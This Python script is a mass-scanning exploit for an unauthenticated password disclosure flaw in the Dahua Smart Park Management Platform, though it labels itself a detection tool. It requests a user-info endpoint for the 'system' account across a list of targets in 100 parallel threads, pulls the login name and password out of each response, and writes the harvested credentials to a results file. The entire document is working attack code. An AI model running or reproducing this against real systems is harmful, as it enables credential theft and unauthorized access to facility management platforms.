import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parser = argparse.ArgumentParser(description="大华智慧园区管理平台任意密码泄露漏洞检测工具")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload =  "/admin/user_getUserInfoByUserName.action?userName=system"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "JSESSIONID=E7EEC7CD8840BB4CB61A941AE7A09603",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "keep-alive"
    }

    try:
        res = requests.get(url=target + payload, timeout=10, headers=headers, verify=False)
        # print(res.text)
        content1 = re.findall('"loginName":"(.*?)"', res.text, re.S)
        content2 = re.findall('"loginPass":"(.*?)"', res.text, re.S)
        # print(content1, content2)

        if '"loginPass":' in res.text:
            print(f"[+]{target}存在任意密码泄露漏洞")
            with open('result2.txt', 'a', encoding='utf-8') as f:
                f.write(f"{target} 用户名: {content1} 密码：{content2}\n")
        elif res.status_code != 200:
            print(f"[+]该{target}可能存在问题请手动测试")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()